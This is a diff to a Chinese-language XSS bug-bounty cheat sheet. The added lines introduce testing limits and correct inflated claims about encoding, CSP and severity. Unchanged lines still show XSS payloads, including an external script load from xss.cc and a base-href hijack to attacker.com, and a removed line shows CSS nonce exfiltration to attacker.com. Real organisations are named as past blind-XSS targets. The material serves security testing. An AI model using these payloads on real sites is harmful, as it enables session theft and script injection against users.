@@ -2,15 +2,21 @@
 
 > 视角：黑盒，目标是让脚本在受害者浏览器执行
 
+## 验证边界
+
+只在隔离页面与批准的测试账户验证执行；自己的资料/留言也可能向其他用户公开，不能据“由自己创建”就投放存储 payload。第三方回调收集器可能接收 URL、会话或页面数据，必须确认允许的数据边界；默认使用本地合成标记而非真实 Cookie/键盘记录。下方 BeEF 控制台命令是未验证的概念标签，未附 CLI，不能作为可执行接口；安装须固定版本、审阅代码并更改默认凭证。
+
+编码必须匹配解析上下文：HTML 实体不会在普通文本中自动变成标签，JavaScript 标识符不支持 `\x61`，URL 编码也不会在事件处理器中自动解码。UTF-7/CSS expression/Flash 是历史环境技术；data: 文档弹窗不自动证明目标源 XSS。`unsafe-eval` 也不自动允许内联 script；JSONP、Angular 和 nonce/base 路径均依具体 CSP、端点和版本。
+
 ## 1. 一句话说清
 
 XSS = 把用户输入当代码执行（HTML/JS）。
 - **存储型**：input 进 DB，访客触发——价值最高（盲打管理员）。
-- **反射型**：input 在 URL 立即回显——价值最低，多数平台不收。
-- **DOM**：纯客户端，不经服务端——常被遗漏。
+- **反射型**：输入在响应中回显；是否可利用取决于上下文、可达性、用户交互和浏览器策略。
+- **DOM**：危险数据流在客户端进入执行汇，也可能包含服务端提供的数据——常被遗漏。
 - **mXSS**：序列化/反序列化时浏览器解析差异。
 
-SRC 价值：管理后台 stored XSS = P1（$300–$3k）；普通 reflected = P3 / 拒收。
+严重度、接收标准和赏金取决于具体计划及已验证影响；反射/存储类型本身不能决定等级或金额。
 
 ---
 
@@ -196,7 +202,7 @@ parent.postMessage('<img src=x onerror=alert(1)>','*')
 | `alert` 关键字 | `confirm` / `prompt` / `print` / `top.alert` / `Function('alert(1)')()` |
 | 引号过滤 | 无引号属性：`<img src=x onerror=alert(1)>` |
 | 长度限制 | 外部加载 `<script src=//xss.cc/j>` / 短链 |
-| HTML5 sandbox | `<iframe srcdoc>` 内的 `<script>` |
+| HTML5 sandbox | srcdoc 不自动绕过 sandbox；缺少 allow-scripts 时脚本仍被禁止 |
 | HTTPOnly Cookie | XSS 读不到，但仍能 CSRF / 钓鱼 / 改密码 |
 | CSP | `script-src 'self'` 时找 jsonp endpoint / unsafe-eval / dangling markup |
 
@@ -227,9 +233,9 @@ mXSS → 复制粘贴 / 邮件预览触发
 ### 配合升级
 
 ```
-反射 XSS + Self-XSS（自己后台只能给自己看） → 配合 CSRF 让别人帮触发 → P0
-存储 XSS + 后台 → 后台沦陷 → P0
-DOM XSS + postMessage → 跨域读 → P0
+反射/Self-XSS 与其他缺陷的组合需逐项证实，不能自动归为 P0
+存储 XSS 在后台执行不自动等于完整后台控制；按实际权限与操作证据评估
+postMessage 数据进入危险汇可能造成 XSS，跨源读取仍须证明具体数据流与同源策略影响
 ```
 
 ---
@@ -246,7 +252,7 @@ DOM XSS + postMessage → 跨域读 → P0
 | 盲打 | 苏宁、成都公安、快速问医生（管理员触发） |
 
 通用指纹：
-- 输入 `<svg onload=alert(1)>` 显示在 DOM 中（F12 看 elements） → 命中
+- Payload 出现在 DOM 中只是落点；需证明测试浏览器在目标源实际执行，排除静态文本/沙箱/不同源
 - 浏览器 alert 弹窗 → 命中
 - HTML 中含 `<script>` 包裹的不可信数据 → 模板渲染缺转义
 
@@ -290,7 +296,7 @@ mXSS / 邮件预览             = 6.5–8.1
 
 ```
 通过 /search 接口的 q 参数，攻击者可注入 HTML/JS 代码并在受害者浏览器执行。
-该参数无认证可访问，CSP 仅设 default-src 'self'，未限制 inline。
+该参数无认证可访问，若 CSP 仅设 default-src 'self' 且无其他放行条件，脚本会回退受此限制，内联通常被阻止；必须填写实际允许执行的策略，不能照抄此示例。
 
 实际可：
 1. 偷取受害者会话 cookie（无 HttpOnly 时）
@@ -659,11 +665,11 @@ _利用CSP未限制base-uri指令劫持脚本加载源，或通过CSS注入/DOM�
 ```
 # base-uri未限制时:
 <base href="http://attacker.com/">
-# 页面中相对路径的脚本将从attacker.com加载
+# base 可改变 URL 解析，script-src 等策略仍决定是否允许加载。
 
 # nonce泄露利用:
 # 通过CSS注入窃取nonce:
-<style>script[nonce^="a"]{background:url(http://attacker.com/?n=a)}</style>
+# nonce 内容属性在现代浏览器中隐藏，CSS 属性选择器不能可靠地泄露它。
 # 或通过DOM读取: document.querySelector("script[nonce]").nonce
 ```
 
